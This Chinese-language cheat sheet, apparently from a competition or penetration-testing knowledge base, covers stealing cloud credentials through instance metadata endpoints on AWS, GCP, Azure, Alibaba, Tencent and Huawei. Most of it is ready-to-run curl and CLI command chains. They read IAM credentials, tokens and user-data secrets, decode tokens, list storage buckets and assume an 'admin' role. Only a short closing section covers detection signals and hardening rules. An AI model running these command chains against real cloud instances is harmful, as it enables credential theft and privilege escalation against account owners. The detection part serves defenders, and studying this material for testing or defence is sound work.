# 云元数据路径：从 169.254.169.254 到被接受的凭据

> 被 `competition-cloud-metadata-path` 引用。这里只回答三件事：
> **哪个元数据面活着、它发什么凭据、这个凭据被谁接受**。
> SSRF 到达技巧在 `ssrf-metadata-pivot.md`，本篇讲身份链。

## 一、四家云的地址与 header 差异（判错就全空）

| 云 | 地址 | 必需 header | 返回形态 | 备注 |
| --- | --- | --- | --- | --- |
| AWS EC2 | `http://169.254.169.254/latest/meta-data/` | IMDSv2 需 `X-aws-ec2-metadata-token` | 纯文本/目录列表 | IMDSv2 要 PUT 拿 token；`fd00:ec2::254` 是 IPv6 端点 |
| AWS ECS | `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` | 无（靠 env 变量） | JSON | 相对 URI 来自 env，不是固定路径 |
| AWS EKS (IRSA) | 同上 `AWS_CONTAINER_CREDENTIALS_FULL_URI` | 可能需 `Authorization`（token 文件） | JSON | 需要 `AWS_WEB_IDENTITY_TOKEN_FILE` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | 文本 | 无 header 一律 403；`169.254.169.254` 也通 |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` | JSON | 必须带 `api-version` |
| 阿里云 ECS | `http://100.100.100.200/latest/meta-data/` | 无 | 文本 | 地址特殊，**不是** 169.254 |
| 阿里云 STS token | `http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>` | 无 | JSON | 有 `SecurityToken` |
| 腾讯云 CVM | `http://metadata.tencentyun.com/latest/meta-data/` | 无 | 文本 | 也支持 `169.254.0.23` |
| 腾讯云 CAM | `http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role>` | 无 | JSON | 返回 TmpSecretId/Key/Token |
| 华为云 | `http://169.254.169.254/openstack/latest/meta_data.json` | 无 | JSON | OpenStack 风格 |

**先做探测再取凭据**，四个地址并行试：

```bash
for u in "http://169.254.169.254/latest/meta-data/" \
         "http://metadata.google.internal/computeMetadata/v1/" \
         "http://100.100.100.200/latest/meta-data/" \
         "http://metadata.tencentyun.com/latest/meta-data/"; do
  echo "== $u"; curl -s -m 3 -w '\n[%{http_code}]\n' "$u" | head -20
done
```

## 二、AWS：IMDSv1 与 IMDSv2 的完整链

```bash
# --- IMDSv1（一条 GET，SSRF 最爱的目标）---
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 返回角色名，例如：ec2-app-role
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | jq .
# → AccessKeyId / SecretAccessKey / Token / Expiration

# --- IMDSv2（两步，SSRF 必须能发 PUT + 自定义 header）---
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ | jq .

# --- 其它高价值字段 ---
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data | head -40
# user-data 里常有 bootstrap 脚本、明文口令、私钥
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

**判定 IMDS 版本**：

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60"
# 200 → v2 可用；403 → 可能强制 v2 或元数据服务关闭
curl -s -o /dev/null -w '%{http_code}\n' http://169.254.169.254/latest/meta-data/
# 401 → 强制 v2（v1 已禁）；200 → v1 仍开（这是漏洞）
```

**验伤（唯一有效证明）**：

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# 必须返回目标账号的 Account/Arid；返回自己账号 = 拿错了
aws sts get-caller-identity --query Account --output text

# 再证明权限边界（这才是"有效凭据"）
aws iam list-attached-role-policies --role-name ec2-app-role
aws s3 ls                       # 能列出什么桶
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin --role-session-name x
```

**注意**：`aws sts get-caller-identity` 成功 ≠ 有权限。要看 `Account` 是不是目标账号，
且 `Arn` 是 `assumed-role/ec2-app-role/i-xxxx` 这种实例角色形态。

## 三、GCP：header 是硬门槛

```bash
H='Metadata-Flavor: Google'
curl -s -H "$H" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
# → default/  或  1234-compute@developer.gserviceaccount.com/
SA=$(curl -s -H "$H" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ | head -1 | tr -d '/')
curl -s -H "$H" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$SA/token" | jq .
# → access_token / expires_in / token_type

curl -s -H "$H" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$SA/scopes
curl -s -H "$H" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -s -H "$H" http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true
# attributes 里常有 startup-script、ssh-keys
```

**验伤**：

```bash
TOKEN=$(curl -s -H "$H" .../token | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN" | jq .
# 看 email / scope / audience —— 这是"这个 token 是谁、能干什么"
curl -s -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects | jq '.projects[].projectId'
gcloud auth activate-service-account --key-file=- ... # 或用 token 直接调 API
```

**GCP 关键判据**：`scopes` 里有 `https://www.googleapis.com/auth/cloud-platform` = 全权；
只有 `devstorage.read_only` 之类 = 受限。这决定后面能做什么。

## 四、Azure：api-version 是必填项

```bash
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | jq '.compute | {name,location,resourceGroupName,subscriptionId}'

# 托管标识 token（IMDS 端点，需 resource 参数）
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | jq .
# → access_token / client_id / expires_on / resource

# 其它 resource：keyvault / graph / storage
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
```

**验伤**：

```bash
AT=$(curl -s -H 'Metadata: true' '...resource=https://management.azure.com/' | jq -r .access_token)
# 解 JWT 看是谁
cut -d. -f2 <<<"$AT" | base64 -d 2>/dev/null | jq '{oid,appid,roles,aud}'

# 真调一次 API
curl -s -H "Authorization: Bearer $AT" \
  'https://management.azure.com/subscriptions?api-version=2020-01-01' | jq '.value[].displayName'
```

**判据**：JWT 的 `roles` 里有 `Contributor`/`Owner` 才算高权；`oid` 是托管标识的对象 ID。

## 五、阿里云 / 腾讯云

```bash
# --- 阿里云 ---
curl -s http://100.100.100.200/latest/meta-data/region-id
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
ROLE=$(curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/)
curl -s "http://100.100.100.200/latest/meta-data/ram/security-credentials/$ROLE" | jq .
# → AccessKeyId / AccessKeySecret / SecurityToken / Expiration
curl -s http://100.100.100.200/latest/user-data | head -30
curl -s http://100.100.100.200/latest/meta-data/instance-id

# --- 腾讯云 ---
curl -s http://metadata.tencentyun.com/latest/meta-data/placement/region
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
ROLE=$(curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/)
curl -s "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/$ROLE" | jq .
# → TmpSecretId / TmpSecretKey / Token
```

**验伤**：

```bash
# 阿里云（用 aliyun CLI 或 aliyun-openapi）
aliyun sts GetCallerIdentity --AccessKeyId ... --AccessKeySecret ... --SecurityToken ...
# 或 curl 直接打
curl -s "https://sts.aliyuncs.com/?Action=GetCallerIdentity&Version=2015-04-01&Format=JSON" \
  --data-urlencode "AccessKeyId=$AK" ... # 需签名，建议用 CLI

# 腾讯云
tccli sts GetCallerIdentity --secretId ... --secretKey ... --token ...
```

**注意**：这两家的临时凭据**必须带 token**，只给 AK/SK 会签名失败
（`InvalidSecurityToken` / `AuthFailure.TokenInvalid`）。这是最常见误判。

## 六、K8s 类元数据面（Pod Identity / IRSA）

```bash
# EKS Pod Identity / IRSA
env | grep -E 'AWS_(ROLE_ARN|WEB_IDENTITY_TOKEN_FILE|CONTAINER_CREDENTIALS)'
cat $AWS_WEB_IDENTITY_TOKEN_FILE | cut -d. -f2 | base64 -d | jq '{sub,aud,iss}'
# sub 形如 system:serviceaccount:ns:sa —— 这是信任策略匹配的依据

# 直接换凭据（有 aws cli 时自动）
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" \
  --role-session-name test \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"

# GKE Workload Identity
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | jq .

# Azure AKS Workload Identity（projected token 换 AAD token）
TOKEN=$(cat /var/run/secrets/azure/tokens/azure-identity-token)
curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$TOKEN"
```

**判据**：`aud` 必须与云侧信任策略匹配（AWS 默认 `sts.amazonaws.com`）。
aud 不匹配 → 换不出来，这是"看起来有 token 其实没用"的典型。

## 七、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 元数据访问 | VPC Flow Logs / 云审计 | 源是 EC2/容器 IP → `169.254.169.254:80` 的异常增量 |
| IMDSv1 被用 | CloudTrail | 无法直接看到，但 GuardDuty 有 `InstanceCredentialExfiltration`  finding |
| 凭据外带使用 | CloudTrail `GetCallerIdentity` | 同一 AK 从非该实例 IP 调用 |
| 角色权限探测 | CloudTrail | 短时间内大量 `iam:List*`、`s3:List*` |
| GCP token 滥用 | Cloud Audit Logs | `principalEmail` 是 compute SA 但从外部 IP 调用 |
| Azure IMDS | Azure Activity Log | 托管标识从非预期资源调用 ARM |
| user-data 读取 | 无原生日志 | 只能靠 endpoint 侧 IDS / 主机 EDR 的 `/latest/user-data` 访问 |

**防守方可落地的检测**（给出可执行规则，不是概念）：

```text
AWS GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.*
AWS Config 规则: ec2-imdsv2-check（required）
GCP: 建议开启 "Metadata Server Requests" 的 VPC 流日志 + 拒绝 169.254.169.254 出站的 egress 策略
Azure: 禁用托管标识，或限制 IMDS 只能从特定子网访问
```

## 八、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| 拿到 AWS 临时凭据 | `aws sts get-caller-identity` 返回目标 Account + `assumed-role/...` | curl 返回 JSON 但字段是 `Code: Success` 且无 `AccessKeyId`（是 IMDS 的错误响应） |
| 凭据有权限 | 能实际列出目标 S3 桶 / 读到 Secret | `get-caller-identity` 成功但其余全 `AccessDenied` → 凭据有效但无权限 |
| 拿到 GCP token | `tokeninfo` 返回目标 SA 的 email | 返回 401 `Invalid Credentials`（token 过期或 scope 不足） |
| 拿到 Azure token | JWT 里 `oid` 是目标托管标识，且 ARM 调用返回订阅列表 | token 拿到了但 `aud` 不对，调 ARM 返回 401 |
| 拿到阿里云 STS | `GetCallerIdentity` 返回目标账号 UID 的 RAM 角色 | 缺 `SecurityToken`，签名报 `InvalidSecurityToken` |

**必须记录的证据块**：

```text
source          从哪打到元数据（进程/pod/代理/SSRF URL）
endpoint        具体 URL + header
raw response    完整 JSON（脱敏后）
identity        账号 ID / ARN / SA email / oid
scope           权限范围（role policies / scopes / roles）
expiry          过期时间（决定证据可复现窗口）
accepted api    用哪个 API 验证过（这才是"被接受"）
```

## 九、常见坑

1. **阿里云地址不是 169.254**。`100.100.100.200`。95% 的人第一次打错。
2. **GCP 不带 `Metadata-Flavor: Google` 一律 403**。纯 URL SSRF 打不动 GCP，必须能注入 header。
3. **Azure 缺 `api-version` 返回 400**，不是没服务。参数必须带。
4. **腾讯云/阿里云临时凭据必须带 token**。只复制 AK/SK 会 `AuthFailure`，
   误判成"凭据无效"。
5. **IMDSv2 强制开启后 v1 返回 401**，很多人当"元数据关了"。看 `PUT /latest/api/token` 能不能 200。
6. **EKS 的 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 是相对路径**，要拼到 `169.254.170.2` 上；
   `FULL_URI` 可能指向 localhost 的 sidecar，不是元数据地址。
7. **拿到凭据不等于打穿**。报告里必须有一条"用这个凭据做成了什么"，
   否则只是"读到了一个 JSON"。